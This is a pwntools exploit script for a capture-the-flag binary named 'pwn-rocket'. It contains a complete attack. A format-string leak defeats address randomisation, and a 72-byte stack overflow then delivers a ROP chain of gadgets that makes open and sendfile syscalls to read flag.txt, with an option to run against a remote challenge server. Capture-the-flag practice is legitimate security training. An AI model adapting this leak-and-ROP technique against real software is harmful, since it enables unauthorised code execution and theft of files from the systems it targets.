from pwn import *
import time

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF("./pwn-rocket")
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 13163)
    else:
        return process(e.path)


p = start()


def ret_leak():
    p.sendline(b"%6$p")
    p.recvuntil(b"<<< Welcome: ")
    leak = int(p.recvline().strip(b"\n"), 16)-0x10E0
    return leak


def sys_open():
    '''syscall(SYS_open, path=*flag, oflags=O_RDONLY)'''
    chain = pop_rax
    chain += p64(constants.SYS_open)
    chain += pop_rdi
    chain += p64(flag_txt)
    chain += pop_rsi
    chain += p64(constants.O_RDONLY)
    chain += p64(0xdeadbeef)
    chain += syscall
    return chain


def sys_sendfile():
    '''syscall(SYS_sendfile, out=STDOUT, in='rax', offset=0, count=0x7fffffff)'''
    chain = pop_rsi
    chain += p64(0x3)
    chain += p64(0xdeadbeef)
    chain += pop_rax
    chain += p64(constants.SYS_sendfile)
    chain += pop_rdi
    chain += p64(constants.STDOUT_FILENO)
    chain += pop_rdx
    chain += p64(0x0)
    chain += pop_r10
    chain += p64(0x7fffffff)
    chain += syscall
    return chain


leak = ret_leak()

flag_txt = next(e.search(b"flag.txt"))+leak
syscall = p64((r.find_gadget(['syscall', 'ret']))[0]+leak)
pop_rax = p64((r.find_gadget(['pop rax', 'ret']))[0]+leak)
pop_rdi = p64((r.find_gadget(['pop rdi', 'ret']))[0]+leak)
pop_rsi = p64((r.find_gadget(['pop rsi', 'pop r15', 'ret']))[0]+leak)
pop_rdx = p64((r.find_gadget(['pop rdx', 'ret']))[0]+leak)
pop_r10 = p64((r.find_gadget(['pop r10', 'ret']))[0]+leak)
pop_r8 = p64((r.find_gadget(['pop r8', 'ret']))[0]+leak)

pad = cyclic(72)

p.sendline(pad+sys_open()+sys_sendfile())
p.interactive()
